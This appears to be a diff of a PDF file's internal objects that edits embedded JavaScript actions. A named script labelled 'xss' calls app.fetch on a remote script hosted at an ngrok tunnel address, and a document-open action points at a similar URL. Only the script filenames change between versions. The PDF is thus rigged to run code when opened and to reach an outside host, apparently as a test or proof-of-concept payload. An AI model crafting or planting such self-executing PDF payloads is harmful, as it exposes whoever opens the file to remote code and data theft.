@@ -80,7 +80,7 @@ endobj
 6 0 obj
 <<
 /Names [(xss) <<
-/JS (app.fetch('https://edad-202-162-37-174.ngrok-free.app/test2.js'))
+/JS (app.fetch('https://edad-202-162-37-174.ngrok-free.app/test22.js'))
 /S /JavaScript
 >>]
 >>
@@ -89,7 +89,7 @@ endobj
 <<
 /AA <<
 /O <<
-/JS (app.alert('https://edad-202-162-37-174.ngrok-free.app/test.js'))
+/JS (app.alert('https://edad-202-162-37-174.ngrok-free.app/test11.js'))
 /S /JavaScript
 >>
 >>
